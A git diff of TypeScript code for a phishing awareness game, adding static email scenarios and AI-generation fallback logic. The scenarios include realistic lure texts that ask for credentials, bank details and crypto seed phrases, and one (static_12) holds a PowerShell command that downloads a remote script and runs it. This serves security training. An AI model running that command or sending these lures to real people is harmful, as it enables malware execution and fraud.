@@ -116,23 +116,204 @@ const BASE_SCENARIOS: Scenario[] = [
     ],
     ioc_categories: ["Suspicious Sender Address", "Sense of Urgency/Fear", "Request for Sensitive Info"],
     explanation: "This is a business email compromise (BEC) attack targeting financial staff by impersonating executives."
+  },
+  {
+    template_id: "static_4",
+    difficulty: "easy",
+    type: "phishing",
+    category: "Logistic Alert",
+    sender: "no-reply@fedex-tracking-portal.com",
+    subject: "Failed Delivery: Action Required",
+    body: "Your package #FX-99281 could not be delivered due to an incorrect address. Please update your details and pay the small redelivery fee ($1.99) here: http://fedex-tracking-portal.com/update-info",
+    red_flags: ["Look-alike domain", "Urgency", "Request for payment link"],
+    ioc_categories: ["Suspicious Links/URLs", "Suspicious Sender Address"],
+    explanation: "Package delivery scams are common and use low-cost fees to capture credit card information."
+  },
+  {
+    template_id: "static_5",
+    difficulty: "medium",
+    type: "phishing",
+    category: "IT Support",
+    sender: "it.helpdesk@company-support-desk.net",
+    subject: "Mandatory Password Synchronization",
+    body: "Due to a recent infrastructure update, all employees must synchronize their Windows and Email passwords. Click here to confirm your current credentials: https://company-support-desk.net/sync",
+    red_flags: ["External .net domain for internal support", "Request for credentials"],
+    ioc_categories: ["Request for Sensitive Info", "Suspicious Sender Address"],
+    explanation: "Credential harvesting often masquerades as mandatory IT maintenance tasks."
+  },
+  {
+    template_id: "static_6",
+    difficulty: "easy",
+    type: "legitimate",
+    category: "IT Alert",
+    sender: "no-reply@github.com",
+    subject: "[GitHub] A new public key was added to your account",
+    body: "The following SSH key was added to your account: (SHA256:...). If you did not add this key, please visit your account settings immediately.",
+    red_flags: [],
+    ioc_categories: [],
+    explanation: "Standard security notification from a trusted service provider."
+  },
+  {
+    template_id: "static_7",
+    difficulty: "medium",
+    type: "phishing",
+    category: "Payroll",
+    sender: "payroll.dept@company-hr-portal.com",
+    subject: "Urgent: Payroll Discrepancy Found",
+    body: "We found a conflict in your banking details for the upcoming pay cycle. To ensure you receive your salary on time, please re-submit your direct deposit form at http://company-hr-portal.com/payroll-fix",
+    red_flags: ["Threat to salary payment", "External link for sensitive financial info"],
+    ioc_categories: ["Sense of Urgency/Fear", "Suspicious Links/URLs"],
+    explanation: "Payroll phishing targets employees' most sensitive financial motivation: getting paid."
+  },
+  {
+    template_id: "static_8",
+    difficulty: "hard",
+    type: "phishing",
+    category: "Lobbying/Legal",
+    sender: "compliance@financial-regulator-gov.site",
+    subject: "Notice of Non-Compliance: Case #4419",
+    body: "Your organization is currently under review for potential violations of the Data Privacy Act. Failure to respond to the evidence attached in the secure portal (domain: financial-regulator-gov.site) within 24 hours will lead to legal action.",
+    red_flags: ["Suspect .site TLD for government body", "Legal pressure"],
+    ioc_categories: ["Suspicious Sender Address", "Sense of Urgency/Fear"],
+    explanation: "High-pressure legal scams use complex language to intimidate targets into clicking."
+  },
+  {
+    template_id: "static_9",
+    difficulty: "easy",
+    type: "phishing",
+    category: "Social Media",
+    sender: "security@instagram-verify-portal.net",
+    subject: "Your account is eligible for verification",
+    body: "Congratulations! Your account has been selected for the blue badge. Click here to confirm your identity and claim your badge: http://instagram-verify-portal.net/badge",
+    red_flags: ["Look-alike domain", "Blue badge lure"],
+    ioc_categories: ["Suspicious Links/URLs"],
+    explanation: "Social media verification lures are common for stealing influencer and high-value accounts."
+  },
+  {
+    template_id: "static_10",
+    difficulty: "medium",
+    type: "legitimate",
+    category: "Service Update",
+    sender: "no-reply@zoom.us",
+    subject: "New Meeting Summary Available",
+    body: "The AI summary for 'Weekly Sync' is now available. You can view it in your Zoom dashboard under the 'Notes' section.",
+    red_flags: [],
+    ioc_categories: [],
+    explanation: "Standard notification from a widely used professional tool."
+  },
+  {
+    template_id: "static_11",
+    difficulty: "easy",
+    type: "phishing",
+    category: "Fintech",
+    sender: "service@pay-pal-security.com",
+    subject: "Your account has been limited",
+    body: "We noticed unusual activity on your PayPal account. To restore access, please verify your bank account here: http://pay-pal-security.com/restore-access",
+    red_flags: ["Dash in company name domain", "Fear-based tactic"],
+    ioc_categories: ["Suspicious Sender Address", "Sense of Urgency/Fear"],
+    explanation: "PayPal-themed phishing is extremely common and targets personal financial access."
+  },
+  {
+    template_id: "static_12",
+    difficulty: "hard",
+    type: "social_engineering",
+    category: "Internal IT",
+    sender: "it-deployment@company.com",
+    subject: "Urgent: System Patch Required for Laptop #8821",
+    body: "Your device has been flagged as missing a critical security patch (KB99281). Please install the update via the following PowerShell command: iwr -useb http://internal-patching.com/p.ps1 | iex",
+    red_flags: ["Request to run arbitrary code/scripts", "External URL for 'internal' patching"],
+    ioc_categories: ["Request for Sensitive Info", "Suspicious Links/URLs"],
+    explanation: "Highly targeted attack asking a user to run a malicious script directly in their terminal."
+  },
+  {
+    template_id: "static_13",
+    difficulty: "medium",
+    type: "legitimate",
+    category: "HR Survey",
+    sender: "surveys@cultureamp.com",
+    subject: "Annual Employee Engagement Survey",
+    body: "Your feedback matters! Please take 10 minutes to complete our annual cultural survey. This link is unique to you and completely anonymous.",
+    red_flags: [],
+    ioc_categories: [],
+    explanation: "Third-party HR tools like CultureAmp are often used by large companies for legitimate feedback."
+  },
+  {
+    template_id: "static_14",
+    difficulty: "easy",
+    type: "phishing",
+    category: "Crypto",
+    sender: "support@metamask-io-wallet.com",
+    subject: "Critical Wallet Update Required",
+    body: "Your MetaMask wallet is outdated. To prevent loss of funds during the upcoming hardfork, please re-sync your 12-word recovery phrase at: http://metamask-io-wallet.com/sync",
+    red_flags: ["Request for seed phrase", "Fear of fund loss"],
+    ioc_categories: ["Request for Sensitive Info", "Sense of Urgency/Fear"],
+    explanation: "Crypto scams almost always try to trick users into revealing their recovery phrases."
+  },
+  {
+    template_id: "static_15",
+    difficulty: "medium",
+    type: "phishing",
+    category: "E-Commerce",
+    sender: "order-update@amazon-logistics-us.net",
+    subject: "Your Amazon order has been cancelled",
+    body: "We were unable to process payment for your recent order of 'MacBook Pro'. Please update your payment method to prevent cancellation: http://amazon-logistics-us.net/check-payment",
+    red_flags: ["Mismatched domain", "High-value item lure"],
+    ioc_categories: ["Suspicious Links/URLs", "Suspicious Sender Address"],
+    explanation: "Amazon order cancellations trigger immediate worry and entice quick clicks."
   }
 ];
 
 async function generateScenarios(count = 5): Promise<Scenario[]> {
+  const getFallbackScenarios = (reqCount: number) => {
+    const companies = ["Globex", "Initech", "Soylent Corp", "Hooli", "Stark Ind", "Waystar", "Umbrella", "Dunder"];
+    const workers = ["Alice", "Bob", "Charlie", "Diana", "Edward", "Fiona", "George", "Hannah"];
+    
+    const results: Scenario[] = [];
+    const pool = [...BASE_SCENARIOS];
+    
+    // Shuffle the pool
+    for (let i = pool.length - 1; i > 0; i--) {
+      const j = Math.floor(Math.random() * (i + 1));
+      [pool[i], pool[j]] = [pool[j], pool[i]];
+    }
+
+    for (let i = 0; i < reqCount; i++) {
+      const base = pool[i % pool.length];
+      const co = companies[i % companies.length];
+      const worker = workers[i % workers.length];
+      
+      // Dynamic content variation to prevent exact repetition
+      let body = base.body.replace(/company/gi, co).replace(/internal portal/gi, `${co} Vault`);
+      let sender = base.sender.replace(/company/gi, co.toLowerCase().replace(/\s/g, '-'));
+      let subject = base.subject.replace(/Your account/gi, `${worker}'s Account`);
+
+      results.push({
+        ...base,
+        template_id: `${base.template_id}_fall_${i}_${Math.random().toString(36).substring(7)}`,
+        subject: i >= pool.length ? `[LOG] ${subject} (Session_${i+1})` : subject,
+        sender,
+        body
+      });
+    }
+    return results;
+  };
+
   if (!ai) {
-    console.warn("AI service not available (API key too short or missing). Using local data bank.");
-    return BASE_SCENARIOS.slice(0, count).map(s => ({ ...s, template_id: `${s.template_id}_${Math.random()}` }));
+    console.warn("AI service not available. Using enhanced local data bank cycle.");
+    return getFallbackScenarios(count);
   }
 
   try {
-    const prompt = `Generate a list of EXACTLY ${count} cyber-security scenarios for a phishing awareness game.
-      CRITICAL: Ensure HIGH RANDOMNESS. Vary the contexts: ecommerce, banking, social media, internal corporate, tech support, etc.
-      Include a mix of 'easy', 'medium', and 'hard' difficulties.
+    const prompt = `Generate a list of EXACTLY ${count} COMPLETELY UNIQUE cyber-security scenarios for a phishing awareness game.
+      CRITICAL: You MUST return EXACTLY ${count} items. 
+      STRICT REQUIREMENT: ZERO REPETITION. Every scenario must have a unique company name, unique sender, unique subject, and unique body.
+      CONTEXT DIVERSITY: Rotate through: Ecommerce (Target, Walmart), Fintech (PayPal, Venmo, Coinbase), SaaS (Salesforce, Slack), Gov (IRS, Social Security), Utilities (Comcast, PG&E), and internal Corporate (Legal, Marketing, Facilities).
+      DIFFICULTY RANGE: Mix of 'easy' (obvious typos), 'medium' (look-alike domains), and 'hard' (targeted BEC or complex social engineering).
+      TYPE RANGE: roughly 70% phishing/social engineering, 30% legitimate.
       Return a JSON array of objects.
       Each object keys: template_id, difficulty (easy|medium|hard), type (phishing|social_engineering|legitimate), category, sender, subject, body, red_flags, ioc_categories, explanation.
       ioc_categories must be from: [${STANDARD_IOCS.join(", ")}].
-      Random Seed: ${Math.random()}.`;
+      Random Seed for unique generation: ${Date.now()}_${Math.random()}.`;
 
     const response = await ai.models.generateContent({
       model: "gemini-3-flash-preview",
@@ -146,21 +327,28 @@ async function generateScenarios(count = 5): Promise<Scenario[]> {
     let scenarios = JSON.parse(text);
     
     if (!Array.isArray(scenarios) || scenarios.length === 0) {
-      throw new Error("Invalid AI response");
+      throw new Error("Invalid AI response format or empty");
     }
 
-    // Clean up ioc_categories to ensure they match our list
-    scenarios = scenarios.map((s: any) => ({
+    // Clean up ioc_categories and ensure they match our list
+    scenarios = scenarios.map((s: any, idx: number) => ({
       ...s,
+      template_id: s.template_id || `gen_${idx}_${Math.random().toString(36).substring(7)}`,
       ioc_categories: Array.isArray(s.ioc_categories) 
         ? s.ioc_categories.filter((cat: string) => STANDARD_IOCS.includes(cat))
         : []
     }));
 
+    if (scenarios.length < count) {
+      console.warn(`AI returned ${scenarios.length} but requested ${count}. Padding with fallbacks.`);
+      const padding = getFallbackScenarios(count - scenarios.length);
+      return [...scenarios, ...padding];
+    }
+
     return scenarios.slice(0, count);
   } catch (error) {
-    console.error("AI Generation failed, using fallbacks:", error);
-    return BASE_SCENARIOS.slice(0, count).map(s => ({ ...s, template_id: `${s.template_id}_${Math.random()}` }));
+    console.error("AI Generation failed, using enhanced fallbacks:", error);
+    return getFallbackScenarios(count);
   }
 }
 
